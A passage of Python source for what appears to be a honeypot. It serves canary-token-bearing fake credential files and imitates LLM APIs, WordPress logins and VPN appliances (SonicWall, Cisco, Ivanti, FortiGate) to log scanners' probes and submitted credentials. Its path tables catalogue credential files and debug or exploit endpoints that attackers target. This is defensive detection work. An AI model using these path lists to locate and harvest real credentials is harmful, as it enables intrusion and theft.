        "text/html; charset=utf-8",
    ),
    CanaryTrap(
        "symfony-parameters-yml",
        (
            # Direct file leak — Symfony 2.x / 3.x legacy
            # `parameters.yml` left in the webroot.
            "/parameters.yml",
            "/config/parameters.yml",
            "/app/config/parameters.yml",
            # Dev-mode `_profiler/open` endpoint — reads any local file
            # via `?file=`. Scanners targeting it almost always pass
            # `file=app/config/parameters.yml` (or similar). The body
            # is the same YAML regardless of the `?file=` value since
            # credential harvesters grep raw bytes for
            # `aws_access_key_id` / `database_password`.
            "/_profiler/open",
            "/app_dev.php/_profiler/open",
            "/symfony/_profiler/open",
            "/frontend_dev.php/_profiler/open",
        ),
        ("aws",),
        render_symfony_parameters_yml,
        "text/yaml; charset=utf-8",
    ),
    CanaryTrap(
        "yii2-debug-view",
        (
            # Yii2 `yii\debug\Module` debug toolbar — dev mode only,
            # exposes the entire app config including DB and mailer
            # creds. Each path is a real-world Yii2 install layout
            # (basic vs advanced templates have different web roots).
            "/debug/default/view",
            "/debug/default/view.html",
            "/debug/default/view/",
            "/web/debug/default/view",
            "/frontend/web/debug/default/view",
            "/backend/web/debug/default/view",
            "/sapi/debug/default/view",
            "/debug/default/db-explain",
        ),
        ("aws",),
        render_yii2_debug_view,
        "text/html; charset=utf-8",
    ),
    CanaryTrap(
        "django-debug-toolbar",
        (
            "/__debug__/render_panel/",
            "/__debug__/render_panel",
            "/__debug__/",
            "/__debug__/sql_select/",
            "/__debug__/sql_explain/",
            "/__debug__/sql_profile/",
            "/__debug__/template_source/",
        ),
        ("aws",),
        render_django_debug_toolbar,
        "text/html; charset=utf-8",
    ),
    # ---- Niche cloud-provider credential files ----------------------------
    # Scanners probing AWS/GCP/Azure also enumerate smaller-provider CLI
    # config files. Each entry below emits a format-accurate config with
    # the Tracebit AWS canary in the field a credential extractor grabs.
    CanaryTrap(
        "oci-config",
        ("/.oci/config",),
        ("aws",),
        render_oci_config,
        "text/plain; charset=utf-8",
    ),
    CanaryTrap(
        "oci-api-key-pem",
        ("/.oci/oci_api_key.pem",),
        ("aws",),
        render_oci_api_key_pem,
        "application/x-pem-file; charset=utf-8",
    ),
    CanaryTrap(
        "hcloud-cli",
        (
            "/.config/hcloud/cli.toml",
            "/.hcloud.toml",
            "/hcloud.yml",
            "/root/.config/hcloud/cli.toml",
            "/home/ubuntu/.config/hcloud/cli.toml",
        ),
        ("aws",),
        render_hcloud_toml,
        "application/toml; charset=utf-8",
    ),
    CanaryTrap(
        "civo-cli",
        (
            "/.config/civo/civo.json",
            "/root/.config/civo/civo.json",
        ),
        ("aws",),
        render_civo_json,
        "application/json; charset=utf-8",
    ),
    CanaryTrap(
        "exoscale-cli",
        (
            "/.config/exoscale/exoscale.toml",
            "/root/.config/exoscale/exoscale.toml",
        ),
        ("aws",),
        render_exoscale_toml,
        "application/toml; charset=utf-8",
    ),
    CanaryTrap(
        "scaleway-cli",
        (
            "/.config/scw/config.yaml",
            "/.config/scaleway/config.yaml",
            "/root/.config/scw/config.yaml",
        ),
        ("aws",),
        render_scaleway_config_yaml,
        "application/x-yaml; charset=utf-8",
    ),
    CanaryTrap(
        "fly-cli",
        (
            "/.fly/auth.yml",
            "/.config/fly/config.yml",
        ),
        ("aws",),
        render_fly_auth_yml,
        "application/x-yaml; charset=utf-8",
    ),
    CanaryTrap(
        "ovh-conf",
        (
            "/.ovh.conf",
            "/root/.ovh.conf",
            "/home/ubuntu/.ovh.conf",
        ),
        ("aws",),
        render_ovh_conf,
        "text/plain; charset=utf-8",
    ),
    CanaryTrap(
        "openstack-clouds-yaml",
        (
            "/.config/openstack/clouds.yaml",
            "/clouds.yaml",
            "/root/.config/openstack/clouds.yaml",
        ),
        ("aws",),
        render_openstack_clouds_yaml,
        "application/x-yaml; charset=utf-8",
    ),
    CanaryTrap(
        "terraform-credentials-tfrc",
        (
            "/.terraform.d/credentials.tfrc.json",
            "/root/.terraform.d/credentials.tfrc.json",
        ),
        ("aws",),
        render_terraform_credentials_tfrc_json,
        "application/json; charset=utf-8",
    ),
    CanaryTrap(
        "terraformrc",
        (
            "/.terraformrc",
            "/root/.terraformrc",
        ),
        ("aws",),
        render_terraformrc,
        "text/plain; charset=utf-8",
    ),
    CanaryTrap(
        "pulumi-credentials",
        (
            "/.pulumi/credentials.json",
            "/root/.pulumi/credentials.json",
        ),
        ("aws",),
        render_pulumi_credentials_json,
        "application/json; charset=utf-8",
    ),
    CanaryTrap(
        "doctl-config",
        (
            "/.config/doctl/config.yaml",
            "/root/.config/doctl/config.yaml",
        ),
        ("aws",),
        render_doctl_config_yaml,
        "application/x-yaml; charset=utf-8",
    ),
    CanaryTrap(
        "linode-cli",
        (
            "/.linode-cli",
            "/root/.linode-cli",
        ),
        ("aws",),
        render_linode_cli,
        "text/plain; charset=utf-8",
    ),
    CanaryTrap(
        "s3cfg",
        (
            "/.s3cfg",
            "/root/.s3cfg",
        ),
        ("aws",),
        render_s3cfg,
        "text/plain; charset=utf-8",
    ),
    CanaryTrap(
        "passwd-s3fs",
        (
            "/.passwd-s3fs",
            "/root/.passwd-s3fs",
        ),
        ("aws",),
        render_passwd_s3fs,
        "text/plain; charset=utf-8",
    ),
    CanaryTrap(
        "cargo-credentials",
        ("/.cargo/credentials",),
        ("aws",),
        render_cargo_credentials,
        "text/plain; charset=utf-8",
    ),
    CanaryTrap(
        "gem-credentials",
        ("/.gem/credentials",),
        ("aws",),
        render_gem_credentials,
        "text/plain; charset=utf-8",
    ),
    CanaryTrap(
        "gh-hosts-yml",
        (
            "/.config/gh/hosts.yml",
            "/root/.config/gh/hosts.yml",
        ),
        ("aws",),
        render_gh_hosts_yml,
        "application/x-yaml; charset=utf-8",
    ),
    CanaryTrap(
        "1password-config",
        (
            "/.config/op/config",
            "/root/.config/op/config",
        ),
        ("aws",),
        render_1password_config,
        "application/json; charset=utf-8",
    ),
    CanaryTrap(
        "cloudflared-config",
        (
            "/etc/cloudflared/config.yml",
            "/etc/cloudflared/cert.pem",
        ),
        ("aws",),
        render_cloudflared_config_yml,
        "application/x-yaml; charset=utf-8",
    ),
    CanaryTrap(
        "wireguard-conf",
        ("/etc/wireguard/wg0.conf",),
        ("aws",),
        render_wireguard_conf,
        "text/plain; charset=utf-8",
    ),
    CanaryTrap(
        "headscale-config",
        (
            "/etc/headscale/config.yaml",
            "/etc/headscale/private.key",
        ),
        ("aws",),
        render_headscale_config_yaml,
        "application/x-yaml; charset=utf-8",
    ),
)

_TRAP_BY_PATH: dict[str, CanaryTrap] = {}
for _trap in CANARY_TRAPS:
    for _p in _trap.paths:
        _TRAP_BY_PATH[_p.lower()] = _trap


def find_canary_trap(path: str) -> "CanaryTrap | None":
    if not CANARY_TRAPS_ENABLED:
        return None
    return _TRAP_BY_PATH.get(path.lower())





# ============================================================================
# Async HTTP handler — aiohttp
# ============================================================================


def _log_context_from_request(request: web.Request, request_id: str, body_bytes_read: int, body_sha256: str) -> dict[str, object]:
    host = clean_host(request.headers.get("X-Forwarded-Host") or request.headers.get("Host") or "")
    client_ip = first_forwarded_ip(request.headers.get("X-Forwarded-For", ""))
    user_agent = request.headers.get("User-Agent", "")
    proto = (request.headers.get("X-Forwarded-Proto") or "http").strip().lower()
    url = request.rel_url
    raw_path = url.raw_path
    query_string = url.raw_query_string
    raw_target = raw_path + (("?" + query_string) if query_string else "")
    path = normalize_path(raw_path)
    return {
        "timestamp": utc_now(),
        "requestId": request_id,
        "method": request.method,
        "host": host,
        "path": path,
        "rawPath": raw_path,
        "rawTarget": raw_target,
        "query": query_string,
        "clientIp": client_ip,
        "userAgent": user_agent,
        "protocol": proto,
        "headers": header_subset(request.headers),
        "bodyBytesRead": body_bytes_read,
        "bodySha256": body_sha256,
    }


async def _handle_llm_endpoint(
    request: web.Request,
    log_context: dict[str, object],
    path: str,
    request_body: bytes,
) -> web.Response:
    """Dispatch a fake LLM-API response by path. Always 200 + JSON; the
    whole point is to look live enough that the scanner keeps going."""
    lpath = path.lower()
    method = request.method
    content_type_req = request.headers.get("Content-Type", "")
    auth_header = request.headers.get("Authorization", "")
    api_key_header = request.headers.get("x-api-key", "") or request.headers.get("X-Api-Key", "")
    has_auth = bool(auth_header) or bool(api_key_header)

    model, prompt, action, _ = extract_llm_prompt(request_body, content_type_req)

    # Route to a renderer.
    if lpath in {"/v1/models"}:
        result_tag = "llm-endpoint-models-list"
        body = render_openai_models()
        if not action:
            action = "models-list"
    elif lpath == "/anthropic/v1/models":
        result_tag = "llm-endpoint-anthropic-models-list"
        body = render_anthropic_models()
        if not action:
            action = "models-list"
    elif lpath == "/api/tags":
        result_tag = "llm-endpoint-ollama-tags"
        body = render_ollama_tags()
        if not action:
            action = "models-list"
    elif lpath == "/api/version":
        result_tag = "llm-endpoint-ollama-version"
        body = render_ollama_version()
        if not action:
            action = "version"
    elif lpath == "/api/ps":
        result_tag = "llm-endpoint-ollama-ps"
        body = render_ollama_ps()
        if not action:
            action = "running-models"
    elif lpath == "/api/show":
        result_tag = "llm-endpoint-ollama-show"
        body = render_ollama_show(model)
        if not action:
            action = "show-model"
    elif lpath == "/api/chat":
        result_tag = "llm-endpoint-ollama-chat"
        body = render_ollama_chat(model)
    elif lpath == "/api/generate":
        result_tag = "llm-endpoint-ollama-generate"
        body = render_ollama_generate(model)
    elif lpath == "/v1/chat/completions":
        result_tag = "llm-endpoint-openai-chat"
        body = render_openai_chat(model)
    elif lpath == "/v1/completions":
        result_tag = "llm-endpoint-openai-completion"
        body = render_openai_completion(model)
    elif lpath == "/v1/embeddings":
        result_tag = "llm-endpoint-openai-embedding"
        body = render_openai_embedding(model)
    elif lpath in {"/v1/messages", "/anthropic/v1/messages"}:
        result_tag = "llm-endpoint-anthropic-message"
        body = render_anthropic_message(model)
    else:
        # Path matched the set but no renderer — shouldn't happen; defensive 404.
        append_log({**log_context, "status": 404, "result": "llm-endpoint-miss"})
        return web.Response(
            status=404, body=b"not found\n",
            headers={"Content-Type": "text/plain; charset=utf-8"},
        )

    log_entry = {
        **log_context,
        "status": 200,
        "result": result_tag,
        "llmPath": path,
        "llmAction": action,
        "llmModel": model,
        "llmHasAuth": has_auth,
        "llmAuthScheme": auth_header.split(" ", 1)[0].lower() if auth_header else "",
        "llmMethod": method,
        "bytes": len(body),
    }
    if prompt:
        log_entry["llmPromptPreview"] = prompt
    append_log(log_entry)

    return web.Response(
        status=200, body=body,
        headers={
            "Content-Type": "application/json; charset=utf-8",
            "Cache-Control": "no-store",
        },
    )


async def _handle_openapi_swagger(
    request: web.Request,
    log_context: dict[str, object],
    request_id: str,
    path: str,
) -> web.Response:
    """Serve a fake OpenAPI/Swagger surface.

    JSON/YAML spec paths return an OpenAPI 3.0.3 document with a Tracebit
    AWS canary embedded in three credential-shaped fields. UI bootstrap
    paths (`/swagger-ui.html`, `/redoc`, …) return a stub HTML page that
    references the spec URL so the scanner's second probe lands on the
    canary-bearing JSON. Keyless deployments fall through to a credential-
    free skeleton instead of an upstream error — better to look alive than
    to tell the scanner to skip us."""
    kind = openapi_swagger_kind(path)
    method = request.method
    client_ip = str(log_context.get("clientIp", ""))
    host = str(log_context.get("host", ""))
    user_agent = str(log_context.get("userAgent", ""))
    proto = str(log_context.get("protocol", ""))
    auth_header = request.headers.get("Authorization", "")
    api_key_header = (
        request.headers.get("X-Api-Key", "")
        or request.headers.get("x-api-key", "")
    )
    has_auth = bool(auth_header) or bool(api_key_header)

    log_extra: dict[str, object] = {
        "swaggerPath": path,
        "swaggerKind": kind,
        "swaggerMethod": method,
        "swaggerHasAuth": has_auth,
    }
    if auth_header:
        log_extra["swaggerAuthScheme"] = auth_header.split(" ", 1)[0].lower()

    if kind in {"spec-json", "spec-yaml"}:
        # Canary issuance is per-IP cached at TTL, so a scanner fanning out
        # across `/swagger.json` + `/v3/api-docs` + `/openapi.json` gets one
        # canary, not N.
        tracebit_response: dict[str, object] | None = None
        canary_status = ""
        if API_KEY:
            tracebit_response = await _get_or_issue_canary(
                ("aws",), client_ip, request_id, host, user_agent, path, proto,
            )
            if tracebit_response is None:
                canary_status = "issue-failed"

        if tracebit_response is not None:
            body = render_openapi_spec(
                tracebit_response, host, yaml=(kind == "spec-yaml"),
            )
            result_tag = (
                "openapi-spec-yaml-issued"
                if kind == "spec-yaml" else "openapi-spec-json-issued"
            )
            canary_status = "issued"
            content_type = (
                "application/yaml; charset=utf-8"
                if kind == "spec-yaml" else "application/json; charset=utf-8"
            )
        else:
            # No canary available — emit a credential-free skeleton so
            # nginx-visible "this host serves a spec" probes still pass.
            # Empty servers + paths sections keep us from advertising fake
            # admin endpoints without a canary backing the spec.
            skeleton = {
                "openapi": "3.0.3",
                "info": {"title": "API", "version": "1.0.0"},
                "paths": {},
            }
            body = json.dumps(skeleton, indent=2).encode("utf-8")
            result_tag = (
                "openapi-spec-yaml-skeleton"
                if kind == "spec-yaml" else "openapi-spec-json-skeleton"
            )
            content_type = (
                "application/yaml; charset=utf-8"
                if kind == "spec-yaml" else "application/json; charset=utf-8"
            )

        log_entry = {**log_context, "status": 200, "result": result_tag, **log_extra, "bytes": len(body)}
        if canary_status:
            log_entry["canaryStatus"] = canary_status
        if tracebit_response is not None:
            log_entry["canaryTypes"] = [k for k, v in tracebit_response.items() if v]
        append_log(log_entry)
        return web.Response(
            status=200, body=body,
            headers={"Content-Type": content_type, "Cache-Control": "no-store"},
        )

    # ui-html
    if path.lower().startswith("/redoc"):
        body = render_redoc_html(host)
        result_tag = "openapi-redoc-html"
    else:
        body = render_swagger_ui_html(host)
        result_tag = "openapi-swagger-ui-html"
    append_log({**log_context, "status": 200, "result": result_tag, **log_extra, "bytes": len(body)})
    return web.Response(
        status=200, body=body,
        headers={"Content-Type": "text/html; charset=utf-8", "Cache-Control": "no-store"},
    )


async def _handle_webapp_form(
    request: web.Request,
    log_context: dict[str, object],
    path: str,
    request_body: bytes,
) -> web.Response:
    """Generic web-app form responder. GET returns plausible HTML so the
    scanner's next request lands a POST with credentials; POST returns a
    302 back to the form (auth-failure shape) so the scanner walks
    through its credential rotation. Both branches log the path/method
    and — for POSTs — the extracted username, has-password / has-email
    flags, the field-name list, and the body preview / sha256."""
    method = request.method
    suffix = _webapp_form_match(path) or "form"
    result_tag = f"webapp-form-{suffix}"
    content_type_req = request.headers.get("Content-Type", "")
    cookie_header = request.headers.get("Cookie", "")
    cookies = parse_cookies(cookie_header)
    # Per-request unique token + session id — no fixed literal across the
    # fleet (see flux design principle: every credential-shaped field is
    # per-hit unique). Tokens here aren't credentials, but the cookie is
    # the same shape a real session id would be, so apply the same rule.
    csrf_token = uuid.uuid4().hex
    session_id = uuid.uuid4().hex

    base_log = {
        **log_context,
        "result": result_tag,
        "webappFormPath": path,
        "webappFormMethod": method,
        "webappFormSuffix": suffix,
    }

    if method == "POST":
        username, has_password, has_email, field_names = extract_webapp_form_creds(
            request_body, content_type_req,
        )
        body_preview = ""
        if request_body:
            body_preview = request_body[:WEBAPP_FORM_BODY_PREVIEW_LIMIT].decode("utf-8", errors="replace")
        # Auth-failure shape: 302 back to the form with `?error=1`. Most
        # credential-stuffing tools interpret the redirect-to-login as
        # "wrong password, try the next pair", which is exactly the
        # follow-on signal we want to elicit.
        location = f"{path}?error=1"
        # Append a fake session cookie so the next request looks like the
        # scanner is "in" enough to keep submitting; logged on subsequent
        # hits via the inbound Cookie header.
        log_entry = {
            **base_log,
            "status": 302,
            "webappFormUsername": username,
            "webappFormHasPassword": has_password,
            "webappFormHasEmail": has_email,
            "webappFormFieldNames": field_names,
            "webappFormHadInboundSession": "session_id" in cookies,
            "bytes": 0,
            "contentType": content_type_req[:120],
        }
        if body_preview:
            log_entry["bodyPreview"] = body_preview
        append_log(log_entry)
        return web.Response(
            status=302, body=b"",
            headers={
                "Location": location,
                "Set-Cookie": f"session_id={session_id}; Path=/; HttpOnly; SameSite=Lax",
                "Cache-Control": "no-store",
            },
        )

    # GET / HEAD — render the form so the scanner has a target to POST
    # back to. HEAD gets the headers without the body (aiohttp handles
    # the Content-Length on web.Response).
    body = render_webapp_form_html(
        suffix=suffix, path=path, csrf_token=csrf_token,
    )
    response_body = b"" if method == "HEAD" else body
    log_entry = {
        **base_log,
        "status": 200,
        "webappFormHadInboundSession": "session_id" in cookies,
        "bytes": len(body),
    }
    append_log(log_entry)
    return web.Response(
        status=200, body=response_body,
        headers={
            "Content-Type": "text/html; charset=utf-8",
            "Cache-Control": "no-store",
            "Content-Length": str(len(body)),
        },
    )


async def _handle_wp_login(
    request: web.Request,
    log_context: dict[str, object],
    path: str,
    request_body: bytes,
) -> web.Response:
    method = request.method
    content_type_req = request.headers.get("Content-Type", "")
    cookie_header = request.headers.get("Cookie", "")
    cookies = parse_cookies(cookie_header)
    client_ip = str(log_context["clientIp"])
    nonce = uuid.uuid4().hex[:10]

    if method == "POST":
        fields = extract_wp_login_creds(request_body, content_type_req)
        submitted_nonce = fields.get("_wpnonce", "")
        nonce_match = _wp_login_nonce_check(client_ip, submitted_nonce) if submitted_nonce else False
        body_preview = ""
        if request_body:
            body_preview = request_body[:WP_LOGIN_BODY_PREVIEW_LIMIT].decode("utf-8", errors="replace")
        log_entry = {
            **log_context,
            "result": "wp-login-credentials",
            "status": 302,
            "wpLoginUsername": fields.get("log", ""),
            "wpLoginHasPwd": fields.get("hasPwd", "") == "true",
            "wpLoginNonceSubmitted": submitted_nonce[:32],
            "wpLoginNonceMatch": nonce_match,
            "wpLoginTestcookiePresent": "wordpress_test_cookie" in cookies,
            "wpLoginRedirectTo": fields.get("redirect_to", "")[:200],
            "bytes": 0,
            "contentType": content_type_req[:120],
        }
        if body_preview:
            log_entry["bodyPreview"] = body_preview
        append_log(log_entry)
        session_id = uuid.uuid4().hex
        return web.Response(
            status=302, body=b"",
            headers={
                "Location": "/wp-login.php?reauth=1",
                "Set-Cookie": f"wordpress_test_cookie=WP+Cookie+check; Path=/; HttpOnly; SameSite=Lax",
                "Cache-Control": "no-store",
            },
        )

    redirect_to = "/wp-admin/"
    body = render_wp_login_html(nonce=nonce, redirect_to=redirect_to)
    _wp_login_nonce_store(client_ip, nonce)
    response_body = b"" if method == "HEAD" else body
    log_entry = {
        **log_context,
        "result": "wp-login-probe",
        "status": 200,
        "wpLoginNonceIssued": nonce,
        "bytes": len(body),
    }
    append_log(log_entry)
    return web.Response(
        status=200, body=response_body,
        headers={
            "Content-Type": "text/html; charset=utf-8",
            "Set-Cookie": f"wordpress_test_cookie=WP+Cookie+check; Path=/; HttpOnly; SameSite=Lax",
            "Cache-Control": "no-store",
            "Content-Length": str(len(body)),
        },
    )


async def _handle_wp_admin_redirect(
    request: web.Request,
    log_context: dict[str, object],
    path: str,
) -> web.Response:
    append_log({
        **log_context,
        "result": "wp-admin-redirect",
        "status": 302,
        "bytes": 0,
    })
    encoded_path = quote(path, safe="")
    return web.Response(
        status=302, body=b"",
        headers={
            "Location": f"/wp-login.php?redirect_to={encoded_path}&reauth=1",
            "Cache-Control": "no-store",
        },
    )


async def _handle_sonicwall(
    request: web.Request,
    log_context: dict[str, object],
    path: str,
    request_body: bytes,
) -> web.Response:
    """Dispatch a fake SonicOS SSL VPN response by path. All 200 + JSON; the
    whole point is to look live enough that the exploit chain proceeds."""
    lpath = path.lower()
    method = request.method
    content_type_req = request.headers.get("Content-Type", "")
    auth_header = request.headers.get("Authorization", "")
    cookie_header = request.headers.get("Cookie", "")
    # SonicOS clients sometimes present a prior session as a `swap_session`
    # or `SonicOS-Session` cookie; we don't validate, just log that it exists.
    has_auth = bool(auth_header) or "swap_session" in cookie_header.lower() or "sonicos-session" in cookie_header.lower()

    username = extract_sonicwall_username(request_body, content_type_req) if method == "POST" else ""

    # Deterministic but per-request session_id so the scanner gets a consistent
    # value to replay in the follow-on step.
    session_id = uuid.uuid4().hex

    body_preview = ""
    if request_body:
        body_preview = request_body[:WEBSHELL_BODY_DECODE_LIMIT].decode("utf-8", errors="replace")

    if lpath == "/api/sonicos/is-sslvpn-enabled":
        result_tag = "sonicwall-is-sslvpn-enabled"
        body = render_sonicwall_is_sslvpn_enabled()
    elif lpath == "/api/sonicos/auth":
        result_tag = "sonicwall-auth"
        body = render_sonicwall_auth_success(session_id)
    elif lpath == "/api/sonicos/tfa":
        result_tag = "sonicwall-tfa"
        body = render_sonicwall_tfa_success(session_id)
    else:
        # Path matched the set but no renderer — shouldn't happen; defensive 404.
        append_log({**log_context, "status": 404, "result": "sonicwall-miss"})
        return web.Response(
            status=404, body=b"not found\n",
            headers={"Content-Type": "text/plain; charset=utf-8"},
        )

    log_entry = {
        **log_context,
        "status": 200,
        "result": result_tag,
        "sonicwallPath": path,
        "sonicwallMethod": method,
        "sonicwallHasAuth": has_auth,
        "sonicwallUsername": username,
        "sonicwallSessionId": session_id,
        "bytes": len(body),
        "contentType": content_type_req[:120],
    }
    if body_preview:
        log_entry["bodyPreview"] = body_preview
    append_log(log_entry)

    return web.Response(
        status=200, body=body,
        headers={
            "Content-Type": "application/json; charset=utf-8",
            "Cache-Control": "no-store",
        },
    )




async def _handle_phpunit_eval(
    request: web.Request,
    log_context: dict[str, object],
    path: str,
    request_body: bytes,
) -> web.Response:
    body_preview = decode_body_preview(request_body)
    body = php_probe_output(body_preview)
    log_entry: dict[str, object] = {
        **log_context,
        "status": 200,
        "result": "phpunit-eval-stdin",
        "phpunitPath": path,
        "phpunitMethod": request.method,
        "phpunitHasPayload": bool(request_body),
        "outputBytes": len(body),
    }
    if body_preview:
        log_entry["bodyPreview"] = body_preview
    append_log(log_entry)
    return web.Response(
        status=200, body=body,
        headers={"Content-Type": "text/plain; charset=utf-8", "Cache-Control": "no-store"},
    )


async def _handle_body_rce(
    request: web.Request,
    log_context: dict[str, object],
    path: str,
    query_string: str,
    request_body: bytes,
) -> web.Response:
    body_preview = decode_body_preview(request_body)
    decoded_command = extract_php_base64_command(body_preview)
    command = decoded_command or body_preview
    family = classify_cmd_injection_command(command)
    if is_php_cgi_rce_request(path, query_string):
        result_tag = "cmd-injection-php-cgi-rce"
        body = php_probe_output(body_preview)
    else:
        result_tag = "cmd-injection-apache-cgi-shell"
        body = b""

    log_entry: dict[str, object] = {
        **log_context,
        "status": 200,
        "result": result_tag,
        "cmdInjectionPath": path,
        "cmdSource": "body",
        "cmdKey": "php://input" if result_tag == "cmd-injection-php-cgi-rce" else "stdin",
        "cmd": command,
        "cmdFamily": family,
        "method": request.method,
        "outputBytes": len(body),
    }
    if body_preview:
        log_entry["bodyPreview"] = body_preview
    if decoded_command:
        log_entry["decodedCommand"] = decoded_command
    append_log(log_entry)
    return web.Response(
        status=200, body=body,
        headers={"Content-Type": "text/plain; charset=utf-8", "Cache-Control": "no-store"},
    )


async def _handle_cisco_webvpn(
    request: web.Request,
    log_context: dict[str, object],
    path: str,
    request_body: bytes,
) -> web.Response:
    lpath = path.lower()
    method = request.method
    host = str(log_context.get("host", ""))
    content_type_req = request.headers.get("Content-Type", "")

    if is_cisco_anyconnect_config_auth(path, request_body):
        result_tag = "cisco-anyconnect-config-auth"
        body = render_cisco_anyconnect_config_auth(host)
        content_type = "application/xml; charset=utf-8"
    elif lpath in {"/+cscoe+/logon.html", "/+cscoe+/portal.html"}:
        result_tag = "cisco-webvpn-logon"
        body = render_cisco_webvpn_logon_html(host)
        content_type = "text/html; charset=utf-8"
    elif lpath == "/+cscoe+/logon_forms.js":
        result_tag = "cisco-webvpn-logon-forms-js"
        body = render_cisco_webvpn_logon_forms_js()
        content_type = "application/javascript; charset=utf-8"
    elif lpath == "/+cscol+/java.jar":
        result_tag = "cisco-webvpn-java-jar"
        body = render_cisco_webvpn_jar_stub("Java.jar")
        content_type = "application/java-archive"
    elif lpath == "/+cscol+/a1.jar":
        result_tag = "cisco-webvpn-a1-jar"
        body = render_cisco_webvpn_jar_stub("a1.jar")
        content_type = "application/java-archive"
    else:
        append_log({**log_context, "status": 404, "result": "cisco-webvpn-miss"})
        return web.Response(
            status=404, body=b"not found\n",
            headers={"Content-Type": "text/plain; charset=utf-8"},
        )

    log_entry: dict[str, object] = {
        **log_context,
        "status": 200,
        "result": result_tag,
        "ciscoWebvpnPath": path,
        "ciscoWebvpnMethod": method,
        "bytes": len(body),
    }
    if request_body:
        username, has_password = extract_cisco_webvpn_form(request_body, content_type_req)
        if username:
            log_entry["ciscoWebvpnUsername"] = username
        log_entry["ciscoWebvpnHasPassword"] = has_password
        anyconnect_version = extract_anyconnect_version(request_body)
        if anyconnect_version:
            log_entry["ciscoAnyconnectVersion"] = anyconnect_version
    append_log(log_entry)

    return web.Response(
        status=200, body=body,
        headers={
            "Content-Type": content_type,
            "Cache-Control": "no-store",
        },
    )


async def _handle_ivanti_vpn(
    request: web.Request,
    log_context: dict[str, object],
    path: str,
    request_body: bytes,
) -> web.Response:
    lpath = path.lower()
    method = request.method
    host = str(log_context.get("host", ""))
    query = str(log_context.get("query", "") or "")
    content_type_req = request.headers.get("Content-Type", "")

    body_preview = ""
    if request_body:
        body_preview = request_body[:WEBSHELL_BODY_DECODE_LIMIT].decode("utf-8", errors="replace")

    has_cmd_injection = _ivanti_has_cmd_injection(body_preview, query)

    if lpath in {
        "/dana-na/auth/url_default/welcome.cgi",
        "/dana-na/auth/url_admin/welcome.cgi",
        "/dana-na/auth/welcome.cgi",
    }:
        result_tag = "ivanti-welcome"
        body = render_ivanti_welcome_html(host)
        content_type = "text/html; charset=utf-8"
    elif lpath == "/dana-na/auth/url_default/login.cgi":
        result_tag = "ivanti-login-post"
        # Per-request DSID so the scanner gets a consistent token to replay
        # in any follow-on `/dana-ws/` request, but every hit generates a
        # fresh value (no fixed literal across the fleet).
        dsid = uuid.uuid4().hex
        body = render_ivanti_login_post(dsid)
        content_type = "text/html; charset=utf-8"
    elif lpath in {
        "/dana-cached/hc/hostcheckerinstaller.osx",
        "/dana-cached/hc/hostcheckerinstaller.exe",
        "/dana-cached/hc/hostcheckerinstaller.dmg",
    }:
        result_tag = "ivanti-hostchecker-installer"
        body = render_ivanti_hostchecker_stub(lpath.rsplit("/", 1)[-1])
        content_type = "application/octet-stream"
    elif lpath == "/dana-ws/namedusers":
        result_tag = "ivanti-namedusers"
        body = render_ivanti_namedusers_json()
        content_type = "application/json; charset=utf-8"
    else:
        # Path matched the set but no renderer — defensive 404, matches the
        # cisco-webvpn / sonicwall miss pattern.
        append_log({**log_context, "status": 404, "result": "ivanti-vpn-miss"})
        return web.Response(
            status=404, body=b"not found\n",
            headers={"Content-Type": "text/plain; charset=utf-8"},
        )

    log_entry: dict[str, object] = {
        **log_context,
        "status": 200,
        "result": result_tag,
        "ivantiPath": path,
        "ivantiMethod": method,
        "ivantiHasCmdInjection": has_cmd_injection,
        "bytes": len(body),
    }
    if request_body and result_tag == "ivanti-login-post":
        username, has_password = extract_ivanti_form(request_body, content_type_req)
        if username:
            log_entry["ivantiUsername"] = username
        log_entry["ivantiHasPassword"] = has_password
    if body_preview:
        log_entry["bodyPreview"] = body_preview[:400]
    append_log(log_entry)

    headers = {"Content-Type": content_type, "Cache-Control": "no-store"}
    if result_tag == "ivanti-login-post":
        # Ivanti sets the DSID cookie on auth success. Reading the body
        # we just rendered to keep the value consistent.
        dsid_match = re.search(r"DSID=([0-9a-f]+)", body.decode("utf-8", errors="ignore"))
        if dsid_match:
            headers["Set-Cookie"] = f"DSID={dsid_match.group(1)}; Path=/; Secure; HttpOnly"
    return web.Response(status=200, body=body, headers=headers)


async def _handle_aspera_faspex(
    request: web.Request,
    log_context: dict[str, object],
    path: str,
    request_body: bytes,
) -> web.Response:
    lpath = path.lower()
    method = request.method
    host = str(log_context.get("host", ""))

    if lpath in {"/aspera/faspex", "/aspera/faspex/"}:
        result_tag = "aspera-faspex-landing"
        body = render_aspera_faspex_landing(host, ASPERA_FASPEX_VERSION)
        content_type = "text/html; charset=utf-8"
    elif lpath == "/aspera/faspex/account/logout":
        result_tag = "aspera-faspex-logout"
        body = render_aspera_logout_json()
        content_type = "application/json; charset=utf-8"
    elif lpath == "/aspera/faspex/package_relay/relay_package":
        result_tag = "aspera-faspex-relay-package"
        body = b"relay package accepted\n"
        content_type = "text/plain; charset=utf-8"
    else:
        append_log({**log_context, "status": 404, "result": "aspera-faspex-miss"})
        return web.Response(
            status=404, body=b"not found\n",
            headers={"Content-Type": "text/plain; charset=utf-8"},
        )

    log_entry: dict[str, object] = {
        **log_context,
        "status": 200,
        "result": result_tag,
        "asperaFaspexPath": path,
        "asperaFaspexMethod": method,
        "bytes": len(body),
    }
    if request_body:
        preview = request_body[:WEBSHELL_BODY_DECODE_LIMIT].decode("utf-8", errors="replace")
        if preview:
            log_entry["bodyPreview"] = preview[:400]
    append_log(log_entry)

    return web.Response(
        status=200, body=body,
        headers={
            "Content-Type": content_type,
            "Cache-Control": "no-store",
        },
    )


async def _handle_fortigate_vpn(
    request: web.Request,
    log_context: dict[str, object],
    path: str,
    request_body: bytes,
) -> web.Response:
    lpath = path.lower()
    method = request.method
    host = str(log_context.get("host", ""))
    query = str(log_context.get("query", "") or "")
    content_type_req = request.headers.get("Content-Type", "")

    body_preview = ""
    if request_body:
        body_preview = request_body[:WEBSHELL_BODY_DECODE_LIMIT].decode("utf-8", errors="replace")

    has_cmd_injection = _fortigate_has_cmd_injection(body_preview, query)

    set_cookie_value: str | None = None

    if lpath == "/remote/login":
        result_tag = "fortigate-login"
        body = render_fortigate_login_html(host, FORTIGATE_VPN_VERSION, FORTIGATE_VPN_BUILD)
        content_type = "text/html; charset=utf-8"
    elif lpath == "/remote/logincheck":
        result_tag = "fortigate-logincheck"
        body = render_fortigate_logincheck()
        content_type = "text/plain; charset=utf-8"
        # SVPNCOOKIE is the cookie name FortiOS sets for an authenticated
        # SSL VPN session. We mint a fresh per-request hex value so every
        # hit ships a distinct cookie — no fixed literal across the fleet.
